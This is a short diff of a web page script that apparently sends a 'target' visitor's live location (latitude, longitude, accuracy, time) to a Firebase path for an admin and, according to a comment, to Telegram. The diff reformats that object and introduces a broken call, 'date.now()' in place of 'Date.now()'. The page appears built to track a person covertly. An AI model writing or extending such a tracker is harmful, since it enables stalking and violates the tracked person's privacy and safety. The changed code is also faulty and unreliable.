@@ -40,7 +40,10 @@
 
                 // Update ke Firebase (Real-time ke Admin)
                 database.ref('live_location/target1').set({
-                    lat: lat, lon: lon, acc: acc, time: Date.now()
+                    lat: lat, 
+                    lon: lon,
+                    acc: acc,
+                    time: date.now()
                 });
 
                 // Update ke Telegram
@@ -57,3 +60,4 @@
     </script>
 </body>
 </html>
+
